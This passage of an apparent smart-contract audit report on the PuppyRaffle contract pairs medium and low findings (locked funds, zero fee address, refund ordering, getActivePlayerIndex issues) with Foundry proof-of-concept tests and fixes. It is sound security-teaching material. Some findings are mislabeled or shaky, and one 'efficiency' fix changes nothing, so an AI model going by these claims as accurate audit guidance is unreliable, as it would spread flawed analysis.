    address player3 = address(12);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 30 days);
        
        // Fund the players
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        vm.deal(player3, 1 ether);
    }
    
    function testLockedFundsScenario() public {
        // Only 3 players enter the raffle (less than the required 4)
        address[] memory players = new address[](1);
        
        // Player 1 enters
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: 1 ether}(players);
        
        // Player 2 enters
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: 1 ether}(players);
        
        // Player 3 enters
        players[0] = player3;
        vm.prank(player3);
        puppyRaffle.enterRaffle{value: 1 ether}(players);
        
        // Fast-forward beyond raffle duration
        vm.warp(block.timestamp + 30 days + 1);
        
        // Attempt to select a winner fails because there aren't enough players
        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
        
        // Check that the owner cannot access these funds at all
        assertEq(address(puppyRaffle).balance, 3 ether);
        
        // Show that the owner has no way to return funds or close the raffle
        vm.startPrank(owner);
        
        // No emergency withdraw function exists
        // No function to reduce the minimum player requirement exists
        // No function to forcibly end the raffle exists
        
        vm.stopPrank();
        
        // Players can individually refund, but if one player is unresponsive
        // or unable to refund (e.g., lost private key), the raffle remains stuck
    }
}

## Suggested Mitigation
Implement emergency functions that allow the contract owner to handle exceptional situations. These should include the ability to pause the contract, force-end a raffle, and allow emergency withdrawals if needed.

```solidity
// Add state variables for pause functionality
bool public paused = false;

// Add a modifier to check if contract is not paused
modifier whenNotPaused() {
    require(!paused, "PuppyRaffle: Contract is paused");
    _;
}

// Add functions to pause/unpause the contract
function setPaused(bool _paused) external onlyOwner {
    paused = _paused;
    emit ContractPaused(_paused);
}

// Update key functions to use the new modifier
function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
    // Existing function body
}

function selectWinner() external whenNotPaused {
    // Existing function body
}

// Add emergency functions
function emergencyWithdraw() external onlyOwner {
    require(paused, "PuppyRaffle: Contract must be paused for emergency withdraw");
    
    // Calculate fees and prize separately
    uint256 contractBalance = address(this).balance;
    uint256 feesAmount = totalFees;
    uint256 playerDeposits = contractBalance - feesAmount;
    
    // Reset state
    totalFees = 0;
    delete players;
    
    // Transfer fees to fee address
    if (feesAmount > 0) {
        (bool feeSuccess,) = feeAddress.call{value: feesAmount}("");
        require(feeSuccess, "PuppyRaffle: Failed to send fees");
    }
    
    // Transfer player deposits to owner temporarily for manual redistribution
    if (playerDeposits > 0) {
        (bool depositSuccess,) = owner().call{value: playerDeposits}("");
        require(depositSuccess, "PuppyRaffle: Failed to withdraw player deposits");
    }
    
    emit EmergencyWithdraw(contractBalance, feesAmount, playerDeposits);
}

// Add a function to forcibly end a raffle that doesn't have enough players
function forceEndRaffle() external onlyOwner {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length > 0 && players.length < 4, "PuppyRaffle: Not applicable");
    
    // Allow all players to request refunds
    for(uint256 i = 0; i < players.length; i++) {
        if(players[i] != address(0)) {
            // Mark players as refunded but require them to withdraw manually
            refundAmount[players[i]] += entranceFee;
            players[i] = address(0);
        }
    }
    
    // Reset the raffle
    delete players;
    raffleStartTime = block.timestamp;
    
    emit RaffleForceEnded();
}
```

## [M-11]. Access Control issue in PuppyRaffle::changeFeeAddress

## Description
In the `PuppyRaffle` contract, `changeFeeAddress` has the `onlyOwner` modifier, but there is no validation that the new fee address is not the zero address. This could lead to fees being permanently locked if the owner accidentally sets the `feeAddress` to `address(0)`.

```solidity
function changeFeeAddress(address newFeeAddress) external onlyOwner {
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

## Impact
If the owner accidentally sets the `feeAddress` to `address(0)`, all fees collected by the contract would be permanently lost as they would be sent to the zero address. This could result in a significant loss of value for the protocol owner over time.

## Proof of Concept
1. The contract owner calls `changeFeeAddress(address(0))` by mistake
2. The `feeAddress` is now set to the zero address
3. When `withdrawFees()` is called, all accumulated fees are sent to the zero address
4. These funds are permanently lost, with no way to recover them

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressFeeTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        
        // Enter some players to generate fees
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        vm.deal(address(10), 4 ether);
        vm.prank(address(10));
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // End raffle and select winner to generate fees
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
    }
    
    function testChangeFeeAddressToZero() public {
        // Verify we have fees to withdraw
        uint256 initialFees = puppyRaffle.totalFees();
        assertGt(initialFees, 0, "Should have fees to withdraw");
        
        // Owner changes fee address to zero address
        vm.prank(owner);
        puppyRaffle.changeFeeAddress(address(0));
        
        // Attempt to withdraw fees to the zero address
        puppyRaffle.withdrawFees();
        
        // Check that totalFees is now 0 (fees were "successfully" sent to zero address)
        assertEq(puppyRaffle.totalFees(), 0, "Fees should be withdrawn");
        
        // The funds sent to address(0) are permanently lost
        assertEq(address(0).balance, initialFees, "Fees sent to zero address");
    }
}

## Suggested Mitigation
Add a zero address check to the `changeFeeAddress` function to prevent setting the fee address to the zero address.

```solidity
function changeFeeAddress(address newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

Additionally, consider adding a similar check to the constructor to ensure the initial `feeAddress` is not set to the zero address.



# Low Risk Findings

## [L-1]. Unchecked Return issue in PuppyRaffle::refund

## Description
The refund function has a misplaced event emission that occurs after external call to sendValue. The vulnerable pattern is:

Address.sendValue(payable(msg.sender), entranceFee);
players[playerIndex] = address(0);
emit RaffleRefunded(playerAddress);

This violates the checks-effects-interactions pattern as state changes and event emissions should occur before external calls.

## Impact
If the sendValue call fails or causes reentrancy, the state update and event emission might not properly reflect the actual contract state, leading to inconsistent state representation.

## Proof of Concept
1. Player calls refund function
2. sendValue is called first (external interaction)
3. If sendValue reverts, the state changes after it won't execute
4. If sendValue allows reentrancy, state changes happen after the external call
5. This can lead to state inconsistency between what events show and actual contract state

## Proof of Code
function testRefundStateInconsistency() public {
    address[] memory players = new address[](1);
    players[0] = address(this);
    
    vm.deal(address(this), 1 ether);
    puppyRaffle.enterRaffle{value: 1 ether}(players);
    
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
    
    // If sendValue were to fail, state wouldn't be updated
    // This test shows the order issue
    vm.expectEmit(true, false, false, false);
    emit RaffleRefunded(address(this));
    
    puppyRaffle.refund(playerIndex);
}

## Suggested Mitigation
Follow the checks-effects-interactions pattern by updating state before external calls:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Effects: Update state first
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    
    // Interactions: External call last
    payable(msg.sender).transfer(entranceFee);
}

## [L-2]. Array Limits issue in PuppyRaffle::getActivePlayerIndex

## Description
The getActivePlayerIndex function returns 0 both for players at index 0 and for players not found in the array. The vulnerable code is:
```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```
This creates ambiguity because a player at index 0 and a non-existent player both return the same value, making it impossible to distinguish between these two states.

## Impact
Functions relying on getActivePlayerIndex cannot distinguish between a player at index 0 and a non-existent player. This could lead to incorrect logic in external integrations or future contract modifications that depend on this function.

## Proof of Concept
1. Enter a player at index 0 in the raffle
2. Call getActivePlayerIndex for this legitimate player - returns 0
3. Call getActivePlayerIndex for a non-existent player - also returns 0
4. External contracts cannot distinguish between these cases

## Proof of Code
```solidity
function testAmbiguousReturnValue() public {
    address[] memory players = new address[](1);
    players[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    
    // Player at index 0 returns 0
    uint256 indexOfRealPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
    assertEq(indexOfRealPlayer, 0);
    
    // Non-existent player also returns 0
    uint256 indexOfFakePlayer = puppyRaffle.getActivePlayerIndex(playerTwo);
    assertEq(indexOfFakePlayer, 0);
    
    // Cannot distinguish between the two cases
    assertEq(indexOfRealPlayer, indexOfFakePlayer);
}```

## Suggested Mitigation
Return a value that indicates 'not found' or use a different return pattern:
```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not found");
}

// Or return a boolean along with the index
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [L-3]. DOS issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function is inefficient and can cause out-of-gas errors for large player arrays. It searches for a player by iterating through the entire `players` array without any optimization, resulting in O(n) complexity. In the worst case, this function may iterate through thousands of players, consuming excessive gas.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

The function also returns 0 if the player is not found, which is problematic because 0 is a valid index that could lead to confusion between "not found" and "found at index 0".

## Impact
This inefficient implementation can lead to excessive gas consumption when the number of players is large. In extreme cases, calls to `getActivePlayerIndex` could exceed the block gas limit, making the function unusable. Additionally, the return value of 0 for "not found" can lead to logical errors if a player at index 0 needs to be distinguished from a player not in the array at all.

## Proof of Concept
1. Many players (e.g., 1000+) enter the raffle
2. A user or contract tries to call `getActivePlayerIndex` to find a specific player
3. The function must iterate through the entire array
4. If the player is at the end of the array or not present at all, the gas cost will be very high
5. For a sufficiently large array, the function call could exceed the block gas limit

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    address[] largePlayerArray;
    uint256 constant NUM_PLAYERS = 1000; // Large enough to demonstrate gas issues
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(0.0001 ether, address(this), 1 days);
        
        // Create a large array of players
        largePlayerArray = new address[](NUM_PLAYERS);
        for (uint256 i = 0; i < NUM_PLAYERS; i++) {
            largePlayerArray[i] = address(uint160(i + 100));
        }
        
        // Fund the test contract
        vm.deal(address(this), NUM_PLAYERS * 0.0001 ether);
        
        // Enter all players into the raffle
        puppyRaffle.enterRaffle{value: NUM_PLAYERS * 0.0001 ether}(largePlayerArray);
    }
    
    function testGasUsageForPlayerAtStart() public view {
        // Look for player at the beginning of the array
        address playerToFind = largePlayerArray[0];
        uint256 gasStart = gasleft();
        uint256 index = puppyRaffle.getActivePlayerIndex(playerToFind);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used to find player at index 0:", gasUsed);
        assert(index == 0);
    }
    
    function testGasUsageForPlayerAtEnd() public view {
        // Look for player at the end of the array
        address playerToFind = largePlayerArray[NUM_PLAYERS - 1];
        uint256 gasStart = gasleft();
        uint256 index = puppyRaffle.getActivePlayerIndex(playerToFind);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used to find player at the end:", gasUsed);
        assert(index == NUM_PLAYERS - 1);
    }
    
    function testGasUsageForNonExistentPlayer() public view {
        // Look for a player that doesn't exist
        address playerToFind = address(999999);
        uint256 gasStart = gasleft();
        uint256 index = puppyRaffle.getActivePlayerIndex(playerToFind);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used to search for non-existent player:", gasUsed);
        assert(index == 0);
    }
}

## Suggested Mitigation
Use a mapping to store player indices for O(1) lookup time, and return a more explicit value for "not found" cases. You can also consider implementing pagination for large arrays.

```solidity
// Add a mapping to track player indices
mapping(address => uint256) private playerIndices;
mapping(address => bool) private isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing code ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
        
        // Store the player's index and mark them as active
        playerIndices[newPlayers[i]] = players.length - 1;
        isActivePlayer[newPlayers[i]] = true;
    }
    
    // ... rest of the function ...
}

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    // ... existing checks ...
    
    // Update our tracking
    isActivePlayer[playerAddress] = false;
    
    // ... rest of the function ...
}

function getActivePlayerIndex(address player) external view returns (uint256) {
    require(isActivePlayer[player], "PuppyRaffle: Player is not active");
    return playerIndices[player];
}

function selectWinner() external {
    // ... existing code ...
    
    // Reset active player tracking when deleting players
    for (uint256 i = 0; i < players.length; i++) {
        isActivePlayer[players[i]] = false;
    }
    delete players;
    
    // ... rest of the function ...
}
```

Alternatively, if you want to keep the function's current behavior but improve efficiency:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not found");
}
```



